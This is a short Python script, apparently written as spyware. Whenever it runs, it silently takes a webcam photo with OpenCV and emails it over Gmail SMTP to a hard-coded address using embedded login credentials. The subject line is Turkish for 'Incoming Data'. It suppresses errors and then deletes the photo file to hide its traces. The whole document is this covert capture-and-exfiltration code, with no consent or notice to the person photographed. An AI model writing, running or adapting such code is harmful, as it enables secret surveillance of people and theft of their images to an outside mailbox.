import cv2
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.base import MIMEBase
import os
import sys
import time

def func():
    photo = cv2.VideoCapture(0)
    time.sleep(1)
    rt,image = photo.read()
    cv2.imwrite("photo.jpg",image)
    photo.release()
    cv2.destroyAllWindows()
    photo_path = open(os.getcwd()+r"\photo.jpg",'rb').read()

    message = MIMEMultipart()
    message["From"] = "tahayagma@gmail.com"
    message["To"] = "tahayagma@gmail.com"
    message["Subject"] = "Gelen Veriler"


    message_govde =MIMEImage(photo_path)
    message.attach(message_govde)

    try:
        mail = smtplib.SMTP("smtp.gmail.com",587)
        mail.ehlo()
        mail.starttls()
        mail.login("tahayagma@gmail.com","***123***")
        mail.sendmail(message["From"],message["To"],message.as_string())
        mail.close()
    except:
        sys.stderr.write("hata")
        sys.stderr.flush()
    time.sleep(5)
    os.system("del photo.jpg")


func()